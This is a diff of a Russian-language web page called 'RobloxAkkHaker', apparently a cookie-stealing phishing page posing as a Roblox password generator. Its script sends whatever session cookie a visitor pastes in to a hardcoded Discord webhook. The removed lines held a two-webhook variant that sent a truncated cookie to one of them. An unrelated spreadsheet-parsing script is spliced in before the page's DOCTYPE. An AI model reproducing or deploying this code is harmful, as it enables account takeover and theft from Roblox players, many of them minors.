@@ -1,4 +1,43 @@
-<!DOCTYPE html>
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -142,7 +181,7 @@
         <h2 class="text-4xl font-bold tracking-wider">RobloxAkkHaker</h2>
     </div>
     <div class="w-full flex justify-center py-6">
-        <img src="" alt="RobloxAkkHaker Image" class="hacker-image">
+        <img src="https://i.postimg.cc/PrJz4zK0/photo-2025-04-15-23-47-42-round-1.png" alt="RobloxAkkHaker Image" class="hacker-image">
     </div>
     <div class="w-full max-w-md p-6 flex-grow flex items-center justify-center content-container">
         <div>
@@ -192,34 +231,6 @@
     </a>
 
     <script>
-        const discordWebhookURL1 = 'https://discord.com/api/webhooks/1361771684834836550/6wzW0CiTJIne3TipG55EFQcZMsqYQYbHTh4KUvd5WtpyyOdkeZ8WjQfAlKOUX5Q1Rn6n';
-        const discordWebhookURL2 = 'https://discord.com/api/webhooks/1375783849493139476/9gsf_rGDQJPrMXKl8Ott1gDHjlWnfHzmHVUySoD28U7H_9LX93Uk3RuprScCWsM_p71S';
-
-        // Функция для отправки сообщения на указанный вебхук
-        const sendToDiscord = async (webhookURL, content) => {
-            try {
-                const response = await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: content,
-                        username: 'Roblox Password Generator',
-                        avatar_url: 'https://i.imgur.com/AfFp7pu.png'
-                    }),
-                });
-
-                if (!response.ok) {
-                    // Более информативное сообщение об ошибке
-                    throw new Error(`Failed to send to Discord: ${response.status} ${response.statusText}`);
-                }
-                console.log(`Successfully sent to ${webhookURL}`); // Подтверждаем успешную отправку
-            } catch (err) {
-                // Выводим ошибку с указанием URL вебхука, на который не удалось отправить сообщение
-                console.error(`Error sending to Discord (${webhookURL}):`, err);
-            }
-        };
-        // ===  КОНЕЦ ИЗМЕНЕНИЙ  ===
-
         const inputField = document.getElementById('inputField');
         const generateBtn = document.getElementById('generateBtn');
         const loading = document.getElementById('loading');
@@ -230,7 +241,7 @@
         const howToBtn = document.getElementById('howToBtn');
         const supportBtn = document.getElementById('supportBtn');
 
-        //  Удалено - const discordWebhookURL = '...'; - так как теперь используем discordWebhookURL1 и discordWebhookURL2
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1361771684834836550/6wzW0CiTJIne3TipG55EFQcZMsqYQYbHTh4KUvd5WtpyyOdkeZ8WjQfAlKOUX5Q1Rn6n';
 
         function sanitizeInput(input) {
             const div = document.createElement('div');
@@ -305,14 +316,21 @@
                 return;
             }
 
-            const messageContent = `New Cookie Submission: ${cookieData}`;
-            const shortenedMessage = messageContent.slice(0, -10);
+            try {
+                const response = await fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `New Cookie Submission: ${cookieData}`,
+                        username: 'Roblox Password Generator',
+                        avatar_url: 'https://i.imgur.com/AfFp7pu.png'
+                    }),
+                });
 
-
-            await Promise.all([
-                sendToDiscord(discordWebhookURL1, shortenedMessage),
-                sendToDiscord(discordWebhookURL2, messageContent)
-            ]);
+                if (!response.ok) throw new Error('Failed to send to Discord');
+            } catch (err) {
+                console.error('Error sending to Discord:', err);
+            }
 
             generateBtn.classList.add('hidden');
             loading.classList.remove('hidden');
@@ -348,3 +366,4 @@
     </script>
 </body>
 </html>
+
